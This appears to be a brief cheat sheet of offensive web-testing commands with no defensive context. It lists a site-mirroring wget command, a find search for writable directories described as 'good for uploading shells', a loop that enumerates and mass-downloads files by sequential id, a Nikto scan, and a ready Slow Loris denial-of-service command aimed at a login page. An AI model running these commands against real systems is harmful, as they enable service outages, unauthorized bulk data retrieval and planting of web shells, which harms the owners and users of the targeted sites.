Mirror website with wget
------------------------
```
wget -mkEpnp http://www.yoursite.org
```
Find Writeable Directories (Good for uploading shells)
------------------------
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; | grep www-data
```

Mass download files by id
------------------------
```bash
#!/bin/bash
   for i in `seq 1000 5000`;
      do
         wget https://your.site.com:80/pathtodownloads/file.php?id=$i
      done
```
Nikto scan all and output to html
------------------------
```
nikto -Display V -o results.html -Format htm -h http://xxx.xxx.xxx.xx:80/directory/
```
Slow Loris (slowhttptest)
------------------------
```
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://xxx.xxx.xxx.xxx/login/login.html -x 24 -p 3
```
